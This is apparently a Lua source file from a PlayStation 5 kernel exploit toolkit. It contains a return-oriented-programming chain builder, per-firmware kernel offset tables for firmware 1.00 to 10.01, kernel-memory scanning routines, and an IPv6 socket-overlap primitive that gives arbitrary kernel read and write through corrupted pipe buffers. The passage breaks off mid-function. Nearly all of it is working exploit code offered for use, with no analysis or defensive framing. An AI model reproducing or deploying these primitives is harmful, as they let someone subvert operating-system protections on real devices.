function ropchain:align_stack()
    if self.stack_offset % 16 == 8 then
        self:push_ret()
    end
end

function ropchain:increment_stack()
    if self.stack_offset >= self.stack_size then
        error("ropchain storage exhausted")
    end
    local rsp = self:get_rsp()
    self.stack_offset = self.stack_offset + 8
    return rsp
end

function ropchain:push(v)
    if self.finalized then
        error("ropchain has been finalized and cant be modified")
    end
    if self.ops_only then
        error("ops-only ropchain cannot contain raw stack values")
    end
    if self.enable_mock_push then
        if v == "__compat_shl_rax_cl" then
            if self._last_rcx == 12 and gadgets["shl rax, 4; ret"] then
                self:increment_stack()
                self:increment_stack()
                self:increment_stack()
                return
            end
        end
        self:increment_stack()
    else
        if v == "__compat_shl_rax_cl" then
            if self._last_rcx == 12 and gadgets["shl rax, 4; ret"] then
                local g = lua.resolve_value(gadgets["shl rax, 4; ret"])
                memory.write_qword(self:increment_stack(), g)
                memory.write_qword(self:increment_stack(), g)
                memory.write_qword(self:increment_stack(), g)
                return
            end
            v = gadgets["shl rax, 3; ret"] or gadgets["ret"] or 0
        elseif type(v) == "string" and v:sub(1, 14) == "__compat_libc_" then
            v = gadgets["ret"] or 0
        end
        memory.write_qword(self:increment_stack(), lua.resolve_value(v or 0))
    end
end

function ropchain:mock_push(callback)
    local before_prep_offset = self.stack_offset
    local saved_ops_len = #self.ops
    self.enable_mock_push = true
    callback()
    self.enable_mock_push = false
    while #self.ops > saved_ops_len do
        table.remove(self.ops)
    end
    local size = self.stack_offset - before_prep_offset
    self.stack_offset = before_prep_offset
    return size
end

function ropchain:push_ret() self:push(gadgets["ret"]) end
function ropchain:push_set_rsp(v) self:push(gadgets["pop rsp; ret"]); self:push(v) end
function ropchain:push_set_rbp(v) self:push(gadgets["pop rbp; ret"] or gadgets["pop rdi; ret"]); self:push(v) end
function ropchain:push_set_rax(v) self:push(gadgets["pop rax; ret"]); self:push(v) end
function ropchain:push_set_rbx(v) self:push(gadgets["pop rbx; ret"] or gadgets["pop rdx; ret"]); self:push(v) end
function ropchain:push_set_rcx(v)
    self._last_rcx = type(v) == "number" and v or (is_uint64(v) and v:tonumber() or nil)
    self:push(gadgets["pop rcx; ret"])
    self:push(v)
end
function ropchain:push_set_rdx(v) self:push(gadgets["pop rdx; ret"]); self:push(v) end
function ropchain:push_set_rdi(v) self:push(gadgets["pop rdi; ret"]); self:push(v) end
function ropchain:push_set_rsi(v) self:push(gadgets["pop rsi; ret"]); self:push(v) end
function ropchain:push_set_r8(v)
    self._last_r8 = v
    self:push(gadgets["pop r8; ret"])
    self:push(v)
end
function ropchain:push_set_r9(v) self:push(gadgets["pop r9; ret"]); self:push(v) end

function ropchain:push_set_rax_from_memory(addr)
    self:push_set_rax(addr)
    self:push(gadgets["mov rax, [rax]; ret"])
end

function ropchain:push_store_eax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], eax; ret"])
end

function ropchain:push_store_rax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_add_to_rax(num)
    if gadgets["add rax, rcx; ret"] then
        self:push_set_rcx(num)
        self:push(gadgets["add rax, rcx; ret"])
    else
        self:push_set_r8(num)
        self:push(gadgets["add rax, r8; ret"])
    end
end

function ropchain:push_add_dword_memory(addr, num)
    local n = uint64(num).l
    if n == 1 and gadgets["inc dword [rax]; ret"] then
        self:push_set_rax(addr)
        self:push(gadgets["inc dword [rax]; ret"])
    else
        self:push_set_rax(addr)
        self:push(gadgets["mov rax, [rax]; ret"])
        self:push_add_to_rax(n)
        self:push_store_eax_into_memory(addr)
    end
end

function ropchain:push_add_atomic_qword(addr, val)
    local n = number(val)
    if n == 1 and gadgets["inc dword [rax]; ret"] then
        self:push_set_rax(addr)
        self:push(gadgets["inc dword [rax]; ret"])
    else
        self:push_set_rax(addr)
        self:push(gadgets["mov rax, [rax]; ret"])
        self:push_add_to_rax(val)
        self:push_store_rax_into_memory(addr)
    end
end

function ropchain:push_increment_atomic_qword(addr)
    self:push_add_atomic_qword(addr, 1)
end

function ropchain:push_decrement_atomic_qword(addr)
    self:push_add_atomic_qword(addr, -1)
end

function ropchain:push_set_reg_from_reg(target_reg, src_reg)
    if not (src_reg == "rax" or src_reg == "rdi") then
        error("ropchain:push_set_reg_from_reg() accepts only rax or rdi as source reg")
    end
    local disp = 0x20
    self["push_store_" .. src_reg .. "_into_memory"](self, self:get_rsp() + disp)
    self["push_set_" .. target_reg](self, 0)
end

function ropchain:push_set_reg_from_rax(reg)
    self:push_set_reg_from_reg(reg, "rax")
end

function ropchain:push_set_reg_from_rdi(reg)
    self:push_set_reg_from_reg(reg, "rdi")
end

function ropchain:push_set_reg_from_memory(reg, addr)
    self:push_set_rax_from_memory(addr)
    self:push_set_reg_from_rax(reg)
end

function ropchain:dispatch_jumptable_with_rax_index(jump_table)
    if gadgets["shl rax, 3; ret"] then
        self:push(gadgets["shl rax, 3; ret"])
    else
        self:push_set_rcx(3)
        self:push(gadgets["shl rax, cl; ret"])
    end
    self:push_add_to_rax(jump_table)
    self:push(gadgets["mov rax, [rax]; ret"])
    self:push_set_reg_from_rax("rsp")
end

function ropchain:create_branch(value_address, op, compare_value)
    local invert = false
    if gadgets["cmp [rcx], eax; ret"] and not gadgets["cmp [rax], ebx; ret"] then
        self:push_set_rcx(value_address)
        self:push_set_rax(compare_value)
        self:push(gadgets["cmp [rcx], eax; ret"])
    else
        self:push_set_rax(value_address)
        self:push_set_rbx(compare_value)
        self:push(gadgets["cmp [rax], ebx; ret"])
    end
    self:push_set_rax(0)
    if op == "==" then
        self:push(gadgets["sete al; ret"])
    elseif op == "~=" then
        if gadgets["setne al; ret"] then
            self:push(gadgets["setne al; ret"])
        else
            self:push(gadgets["sete al; ret"])
            invert = true
        end
    elseif op == ">" then
        self:push(gadgets["seta al; ret"])
    elseif op == "<" then
        self:push(gadgets["setb al; ret"])
    else
        errorf("ropchain:create_branch: invalid op (%s)", tostring(op))
    end
    local jump_table = memory.alloc(0x10)
    self:dispatch_jumptable_with_rax_index(jump_table)
    return jump_table, invert
end

function ropchain:gen_conditional(value_address, op, compare_value, callback)
    local jump_table, invert = self:create_branch(value_address, op, compare_value)
    local jmp_cond_true = self:get_rsp()
    callback()
    local jmp_cond_false = self:get_rsp()
    if invert then
        memory.write_multiple_qwords(jump_table, { jmp_cond_true, jmp_cond_false })
    else
        memory.write_multiple_qwords(jump_table, { jmp_cond_false, jmp_cond_true })
    end
end

function ropchain:gen_loop(value_address, op, compare_value, callback)
    local loopback = self:get_rsp()
    local jump_table, invert = self:create_branch(value_address, op, compare_value)
    local jmp_cond_true = self:get_rsp()
    callback()
    self:push_set_rsp(loopback)
    local jmp_cond_false = self:get_rsp()
    if invert then
        memory.write_multiple_qwords(jump_table, { jmp_cond_true, jmp_cond_false })
    else
        memory.write_multiple_qwords(jump_table, { jmp_cond_false, jmp_cond_true })
    end
end

function ropchain:push_write_dword_memory(addr, v)
    if not self.enable_mock_push then
        table.insert(self.ops, { kind = "write32", addr = addr, val = v })
    end
    if self.ops_only then return end
    self:push_set_rax(v)
    self:push_store_eax_into_memory(addr)
end

function ropchain:push_write_qword_memory(addr, v)
    if not self.enable_mock_push then
        table.insert(self.ops, { kind = "write64", addr = addr, val = v })
    end
    if self.ops_only then return end
    self:push_set_rax(v)
    self:push_store_rax_into_memory(addr)
end

function ropchain:create_hole(hole_size)
    self:push_set_rsp(self:get_rsp() + 0x10 + hole_size)
    self.stack_offset = self.stack_offset + hole_size
end

function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    if rdi then self:push_set_rdi(rdi) end
    if rsi then self:push_set_rsi(rsi) end
    if rdx then self:push_set_rdx(rdx) end
    if rcx then self:push_set_rcx(rcx) end
    if r8 then self:push_set_r8(r8) end
    if r9 then self:push_set_r9(r9) end
end

function ropchain:push_syscall_raw(sysc, prep_arg_callback)
    if self.ops_only then
        error("ops-only ropchain requires push_syscall")
    end
    local fn_addr = type(sysc) == "table" and sysc.fn_addr or ((syscall_addrs[20] or uint64(0)) + 7)
    local syscall_no = type(sysc) == "table" and sysc.syscall_no or sysc
    local push_size = 0
    local push_cb = function()
        self:push_write_qword_memory(self:get_rsp() + push_size, fn_addr)
        if prep_arg_callback then prep_arg_callback() end
        self:push_set_rax(syscall_no)
        self:create_hole(0x10)
    end
    push_size = self:mock_push(push_cb)
    local saved_ops = #self.ops
    push_cb()
    while #self.ops > saved_ops do table.remove(self.ops) end
    self:push(0)
end

function ropchain:push_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9)
    local syscall_no = type(sysc) == "table" and sysc.syscall_no or sysc
    if not self.enable_mock_push then
        table.insert(self.ops, {
            kind = "syscall", num = syscall_no,
            args = { rdi, rsi, rdx, rcx, r8, r9 }
        })
    end
    if self.ops_only then return end
    self:push_syscall_raw(sysc, function()
        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    end)
end

function ropchain:push_syscall_with_ret(sysc, rdi, rsi, rdx, rcx, r8, r9)
    self:push_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9)
    local buf = self:push_store_retval()
    if not self.enable_mock_push and #self.ops > 0 then
        self.ops[#self.ops].ret_addr = buf
    end
end

function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    if not self.enable_mock_push then
        table.insert(self.ops, {
            kind = "fcall", rip = rip,
            args = { rdi, rsi, rdx, rcx, r8, r9 }
        })
    end
    if self.ops_only then return end
    self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    self:align_stack()
    self:push(rip)
end

function ropchain:push_fcall_with_ret(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    local buf = self:push_store_retval()
    if not self.enable_mock_push and #self.ops > 0 then
        self.ops[#self.ops].ret_addr = buf
    end
end

function ropchain:push_store_retval()
    local buf = memory.alloc(8)
    table.insert(self.retval_addr, buf)
    if not self.ops_only then self:push_store_rax_into_memory(buf) end
    return buf
end

function ropchain:get_last_retval_addr()
    return self.retval_addr[#self.retval_addr]
end

function ropchain:restore_through_longjmp(jmpbuf)
    if not self.finalized then
        if self.ops_only then
            self.jmpbuf = jmpbuf
            self.finalized = true
            return
        end
        self.jmpbuf = jmpbuf or memory.alloc(0x60)
        self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)
        if #self.ops > 0 and self.ops[#self.ops].rip == libc_addrofs.longjmp then
            table.remove(self.ops)
        end
        self.finalized = true
    end
end

function ropchain:execute_through_coroutine()
    if run_rop_batch then
        local batch = {}
        for _, op in ipairs(self.ops) do
            if op.kind == "syscall" or op.kind == "fcall" then
                local margs = {}
                for j = 1, 6 do
                    local v = op.args[j]
                    if v ~= nil then
                        if type(v) == "string" then
                            v = lua.resolve_value(v)
                        end
                        margs[j] = v
                    end
                end
                table.insert(batch, {
                    kind = op.kind,
                    num = op.num,
                    rip = op.rip,
                    args = margs,
                    ret_addr = op.ret_addr,
                })
            else
                table.insert(batch, op)
            end
        end
        if run_rop_batch(batch) then
            local retval = self:get_last_retval_addr()
            if retval then return memory.read_qword(retval) end
            return uint64(0)
        end
    end
    local last_ret = uint64(0)
    for _, op in ipairs(self.ops) do
        if op.kind == "write32" then
            memory.write_dword(op.addr, op.val)
        elseif op.kind == "write64" then
            memory.write_qword(op.addr, op.val)
        elseif op.kind == "syscall" then
            last_ret = syscall.call(op.num, table.unpack(op.args, 1, 6))
            if op.ret_addr then memory.write_qword(op.ret_addr, last_ret) end
        elseif op.kind == "fcall" then
            last_ret = fcall(op.rip)(table.unpack(op.args, 1, 6))
            if op.ret_addr then memory.write_qword(op.ret_addr, last_ret) end
        end
    end
    local retval = self:get_last_retval_addr()
    if retval then return memory.read_qword(retval) end
    return last_ret
end

ps5_kernel_offset_list = {
    [{ "1.00", "1.01", "1.02" }] = {
        DATA_BASE = 0x01B40000, DATA_SIZE = 0x08631930,
        DATA_BASE_DYNAMIC = 0x00000000, DATA_BASE_TO_DYNAMIC = 0x0658BB58,
        DATA_BASE_ALLPROC = 0x026D1BF8, DATA_BASE_SECURITY_FLAGS = 0x06241074,
        DATA_BASE_ROOTVNODE = 0x06565540, DATA_BASE_KERNEL_PMAP_STORE = 0x02F9F2B8,
        DATA_BASE_DATA_CAVE = 0x05F20000, DATA_BASE_GVMSPACE = 0x06202E70,
        PMAP_STORE_PML4PML4I = -0x1C, PMAP_STORE_DMPML4I = 0x288, PMAP_STORE_DMPDPI = 0x28C,
    },
    [{ "1.05", "1.10", "1.11", "1.12", "1.13", "1.14" }] = {
        DATA_BASE = 0x01B40000, DATA_SIZE = 0x08631930,
        DATA_BASE_DYNAMIC = 0x00000000, DATA_BASE_TO_DYNAMIC = 0x0658BB58,
        DATA_BASE_ALLPROC = 0x026D1C18, DATA_BASE_SECURITY_FLAGS = 0x06241074,
        DATA_BASE_ROOTVNODE = 0x06565540, DATA_BASE_KERNEL_PMAP_STORE = 0x02F9F328,
        DATA_BASE_DATA_CAVE = 0x05F20000, DATA_BASE_GVMSPACE = 0x06202E70,
        PMAP_STORE_PML4PML4I = -0x1C, PMAP_STORE_DMPML4I = 0x288, PMAP_STORE_DMPDPI = 0x28C,
    },
    [{ "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70" }] = {
        DATA_BASE = 0x01B80000, DATA_SIZE = 0x087E1930,
        DATA_BASE_DYNAMIC = 0x00000000, DATA_BASE_TO_DYNAMIC = 0x06739B88,
        DATA_BASE_ALLPROC = 0x02701C28, DATA_BASE_SECURITY_FLAGS = 0x063E1274,
        DATA_BASE_ROOTVNODE = 0x067134C0, DATA_BASE_KERNEL_PMAP_STORE = 0x031338C8,
        DATA_BASE_DATA_CAVE = 0x060C0000, DATA_BASE_GVMSPACE = 0x063A2EB0,
        PMAP_STORE_PML4PML4I = -0x1C, PMAP_STORE_DMPML4I = 0x288, PMAP_STORE_DMPDPI = 0x28C,
    },
    [{ "3.00", "3.20", "3.21" }] = {
        DATA_BASE = 0x0BD0000, DATA_SIZE = 0x08871930,
        DATA_BASE_DYNAMIC = 0x00010000, DATA_BASE_TO_DYNAMIC = 0x067D1B90,
        DATA_BASE_ALLPROC = 0x0276DC58, DATA_BASE_SECURITY_FLAGS = 0x06466474,
        DATA_BASE_ROOTVNODE = 0x067AB4C0, DATA_BASE_KERNEL_PMAP_STORE = 0x031BE218,
        DATA_BASE_DATA_CAVE = 0x06140000, DATA_BASE_GVMSPACE = 0x06423F80,
        PMAP_STORE_PML4PML4I = -0x1C, PMAP_STORE_DMPML4I = 0x288, PMAP_STORE_DMPDPI = 0x28C,
    },
    [{ "4.00", "4.02", "4.03", "4.50", "4.51" }] = {
        DATA_BASE = 0x0C00000, DATA_SIZE = 0x087B1930,
        DATA_BASE_DYNAMIC = 0x00010000, DATA_BASE_TO_DYNAMIC = 0x0670DB90,
        DATA_BASE_ALLPROC = 0x027EDCB8, DATA_BASE_SECURITY_FLAGS = 0x06506474,
        DATA_BASE_ROOTVNODE = 0x066E74C0, DATA_BASE_KERNEL_PMAP_STORE = 0x03257A78,
        DATA_BASE_DATA_CAVE = 0x06C01000, DATA_BASE_GVMSPACE = 0x064C3F80,
        PMAP_STORE_PML4PML4I = -0x1C, PMAP_STORE_DMPML4I = 0x288, PMAP_STORE_DMPDPI = 0x28C,
    },
    [{ "5.00", "5.02", "5.10" }] = {
        DATA_BASE = 0x0C40000, DATA_SIZE = 0x08921930,
        DATA_BASE_DYNAMIC = 0x00010000, DATA_BASE_TO_DYNAMIC = 0x06879C00,
        DATA_BASE_ALLPROC = 0x0291DD00, DATA_BASE_SECURITY_FLAGS = 0x066466EC,
        DATA_BASE_ROOTVNODE = 0x06853510, DATA_BASE_KERNEL_PMAP_STORE = 0x03398A88,
        DATA_BASE_DATA_CAVE = 0x06320000, DATA_BASE_GVMSPACE = 0x06603FB0,
        PMAP_STORE_PML4PML4I = -0x105C, PMAP_STORE_DMPML4I = 0x29C, PMAP_STORE_DMPDPI = 0x2A0,
    },
    [{ "5.50" }] = {
        DATA_BASE = 0x0C40000, DATA_SIZE = 0x08921930,
        DATA_BASE_DYNAMIC = 0x00010000, DATA_BASE_TO_DYNAMIC = 0x06879C00,
        DATA_BASE_ALLPROC = 0x0291DD00, DATA_BASE_SECURITY_FLAGS = 0x066466EC,
        DATA_BASE_ROOTVNODE = 0x06853510, DATA_BASE_KERNEL_PMAP_STORE = 0x03394A88,
        DATA_BASE_DATA_CAVE = 0x06320000, DATA_BASE_GVMSPACE = 0x06603FB0,
        PMAP_STORE_PML4PML4I = -0x105C, PMAP_STORE_DMPML4I = 0x29C, PMAP_STORE_DMPDPI = 0x2A0,
    },
    [{ "6.00", "6.02", "6.50" }] = {
        DATA_BASE = 0x0C60000, DATA_SIZE = 0x08861930,
        DATA_BASE_DYNAMIC = 0x00010000, DATA_BASE_TO_DYNAMIC = 0x067C5C10,
        DATA_BASE_ALLPROC = 0x02869D20, DATA_BASE_SECURITY_FLAGS = 0x065968EC,
        DATA_BASE_ROOTVNODE = 0x0679F510, DATA_BASE_KERNEL_PMAP_STORE = 0x032E4358,
        DATA_BASE_DATA_CAVE = 0x06270000, DATA_BASE_GVMSPACE = 0x065540F0,
        PMAP_STORE_PML4PML4I = -0x105C, PMAP_STORE_DMPML4I = 0x29C, PMAP_STORE_DMPDPI = 0x2A0,
    },
    [{ "7.00", "7.01", "7.20", "7.40", "7.60", "7.61" }] = {
        DATA_BASE = 0x0C50000, DATA_SIZE = 0x05191930,
        DATA_BASE_DYNAMIC = 0x00010000, DATA_BASE_TO_DYNAMIC = 0x030EDC40,
        DATA_BASE_ALLPROC = 0x02859D50, DATA_BASE_SECURITY_FLAGS = 0x00AC8064,
        DATA_BASE_ROOTVNODE = 0x030C7510, DATA_BASE_KERNEL_PMAP_STORE = 0x02E2C848,
        DATA_BASE_DATA_CAVE = 0x050A1000, DATA_BASE_GVMSPACE = 0x02E76090,
        PMAP_STORE_PML4PML4I = -0x10AC, PMAP_STORE_DMPML4I = 0x29C, PMAP_STORE_DMPDPI = 0x2A0,
    },
    [{ "8.00", "8.20", "8.40", "8.60" }] = {
        DATA_BASE = 0xC70000, DATA_BASE_DYNAMIC = 0x10000,
        DATA_BASE_ALLPROC = 0x2875D50, DATA_BASE_SECURITY_FLAGS = 0xAC3064,
        DATA_BASE_ROOTVNODE = 0x30FB510, DATA_BASE_KERNEL_PMAP_STORE = 0x2E48848,
        DATA_BASE_GVMSPACE = 0x2EAA090,
    },
    [{ "9.00" }] = {
        DATA_BASE = 0xCA0000, DATA_BASE_DYNAMIC = 0x10000,
        DATA_BASE_ALLPROC = 0x2755D50, DATA_BASE_SECURITY_FLAGS = 0xD72064,
        DATA_BASE_ROOTVNODE = 0x2FDB510, DATA_BASE_KERNEL_PMAP_STORE = 0x2D28B78,
        DATA_BASE_GVMSPACE = 0x2D8A570,
    },
    [{ "9.05", "9.20", "9.40", "9.60" }] = {
        DATA_BASE = 0xCA0000, DATA_BASE_DYNAMIC = 0x10000,
        DATA_BASE_ALLPROC = 0x2755D50, DATA_BASE_SECURITY_FLAGS = 0xD73064,
        DATA_BASE_ROOTVNODE = 0x2FDB510, DATA_BASE_KERNEL_PMAP_STORE = 0x2D28B78,
        DATA_BASE_GVMSPACE = 0x2D8A570,
    },
    [{ "10.00", "10.01" }] = {
        DATA_BASE = 0xCC0000, DATA_BASE_DYNAMIC = 0x10000,
        DATA_BASE_ALLPROC = 0x2765D70, DATA_BASE_SECURITY_FLAGS = 0xD79064,
        DATA_BASE_ROOTVNODE = 0x2FA3510, DATA_BASE_KERNEL_PMAP_STORE = 0x2CF0EF8,
        DATA_BASE_GVMSPACE = 0x2D52570,
    },
}

function get_ps5_kernel_offset()
    local ko = {}
    for fw_list, offsets in pairs(ps5_kernel_offset_list) do
        for _, check_fw in ipairs(fw_list) do
            if check_fw == FW_VERSION then
                for k, v in pairs(offsets) do ko[k] = v end
                ko.DATA_BASE_TARGET_ID = ko.DATA_BASE_SECURITY_FLAGS + 0x09
                ko.DATA_BASE_QA_FLAGS = ko.DATA_BASE_SECURITY_FLAGS + 0x24
                ko.DATA_BASE_UTOKEN_FLAGS = ko.DATA_BASE_SECURITY_FLAGS + 0x8C
                break
            end
        end
    end
    ko.PROC_FD = 0x48
    ko.PROC_PID = 0xbc
    ko.PROC_VM_SPACE = 0x200
    ko.PROC_COMM = -1
    ko.PROC_SYSENT = -1
    ko.FILEDESC_OFILES = 0x8
    ko.SIZEOF_OFILES = 0x30
    ko.VMSPACE_VM_PMAP = -1
    ko.VMSPACE_VM_VMID = -1
    ko.PMAP_CR3 = 0x28
    ko.SIZEOF_GVMSPACE = 0x100
    ko.GVMSPACE_START_VA = 0x8
    ko.GVMSPACE_SIZE = 0x10
    ko.GVMSPACE_PAGE_DIR_VA = 0x38
    ko.SO_PCB = 0x18
    ko.INPCB_PKTOPTS = 0x120
    return ko
end

function get_kernel_offset()
    return get_ps5_kernel_offset()
end

kernel_offset = get_kernel_offset()

function find_vmspace_pmap_offset()
    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
    local cur_scan_offset = 0x1C8
    for i = 1, 6 do
        local scan_val = kernel.read_qword(vmspace + cur_scan_offset + (i * 8))
        local offset_diff = (scan_val - vmspace):tonumber()
        if offset_diff >= 0x2C0 and offset_diff <= 0x2F0 then
            return cur_scan_offset + (i * 8)
        end
    end
    error("failed to find VMSPACE_VM_PMAP offset")
end

function find_vmspace_vmid_offset()
    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
    local cur_scan_offset = 0x1D4
    for i = 1, 8 do
        local scan_offset = cur_scan_offset + (i * 4)
        local scan_val = kernel.read_dword(vmspace + scan_offset):tonumber()
        if scan_val > 0 and scan_val <= 0x10 then
            return scan_offset
        end
    end
    error("failed to find VMSPACE_VM_VMID offset")
end

function find_proc_offsets()
    local proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000)
    local p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb")
    local p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f")
    if not p_comm_sign or #p_comm_sign == 0 then error("failed to find offset for PROC_COMM") end
    if not p_sysent_sign or #p_sysent_sign == 0 then error("failed to find offset for PROC_SYSENT") end
    return {
        PROC_COMM = p_comm_sign[1] - 1 + 0x8,
        PROC_SYSENT = p_sysent_sign[1] - 1 - 0x10,
    }
end

function find_additional_offsets()
    local proc_offsets = find_proc_offsets()
    return {
        PROC_COMM = proc_offsets.PROC_COMM,
        PROC_SYSENT = proc_offsets.PROC_SYSENT,
        VMSPACE_VM_PMAP = find_vmspace_pmap_offset(),
        VMSPACE_VM_VMID = find_vmspace_vmid_offset(),
    }
end

function update_kernel_offsets()
    local offsets = find_additional_offsets()
    for k, v in pairs(offsets) do kernel_offset[k] = v end
end
initialize_kernel_offsets = update_kernel_offsets

kernel = { addr = {} }
function kernel.read_byte(kaddr)
    local v = kernel.read_buffer(kaddr, 1)
    return v and #v == 1 and uint64.unpack(v) or nil
end
function kernel.read_word(kaddr)
    local v = kernel.read_buffer(kaddr, 2)
    return v and #v == 2 and uint64.unpack(v) or nil
end
function kernel.read_dword(kaddr)
    local v = kernel.read_buffer(kaddr, 4)
    return v and #v == 4 and uint64.unpack(v) or nil
end
function kernel.read_qword(kaddr)
    local v = kernel.read_buffer(kaddr, 8)
    return v and #v == 8 and uint64.unpack(v) or nil
end
function kernel.hex_dump(kaddr, size)
    size = size or 0x40
    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
end
function kernel.read_null_terminated_string(kaddr)
    local result = ""
    while true do
        local chunk = kernel.read_buffer(kaddr, 0x8)
        local null_pos = chunk:find("\0", 1, true)
        if null_pos then return result .. chunk:sub(1, null_pos - 1) end
        result = result .. chunk
        kaddr = kaddr + #chunk
    end
end
function kernel.write_byte(dest, value) kernel.write_buffer(dest, ub8(value):sub(1, 1)) end
function kernel.write_word(dest, value) kernel.write_buffer(dest, ub8(value):sub(1, 2)) end
function kernel.write_dword(dest, value) kernel.write_buffer(dest, ub8(value):sub(1, 4)) end
function kernel.write_qword(dest, value) kernel.write_buffer(dest, ub8(value):sub(1, 8)) end

ipv6_kernel_rw = { data = {} }
function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)
    ipv6_kernel_rw.ofiles = ofiles
    ipv6_kernel_rw.kread8 = kread8
    ipv6_kernel_rw.kwrite8 = kwrite8
    ipv6_kernel_rw.create_pipe_pair()
    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
end
function ipv6_kernel_rw.get_fd_data_addr(fd)
    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0)
    return ipv6_kernel_rw.kread8(file_addr + 0x0)
end
function ipv6_kernel_rw.create_pipe_pair()
    local read_fd, write_fd = create_pipe()
    ipv6_kernel_rw.data.pipe_read_fd = read_fd
    ipv6_kernel_rw.data.pipe_write_fd = write_fd
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
end
function ipv6_kernel_rw.create_overlapped_ipv6_sockets()
    local master_target_buffer = memory.alloc(0x14)
    local slave_buffer = memory.alloc(0x14)
    local pktinfo_size_store = memory.alloc(0x8)
    memory.write_qword(pktinfo_size_store, 0x14)
    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)
    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)
    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)
    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
    ipv6_kernel_rw.data.slave_buffer = slave_buffer
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
    ipv6_kernel_rw.data.master_sock = master_sock
    ipv6_kernel_rw.data.victim_sock = victim_sock
end
function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
end
function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
end
function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
end
function ipv6_kernel_rw.ipv6_kread8(kaddr)
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
end
function ipv6_kernel_rw.copyout(kaddr, uaddr, len)
    assert(kaddr and uaddr and len)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
end
function ipv6_kernel_rw.copyin(uaddr, kaddr, len)
    assert(kaddr and uaddr and len)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
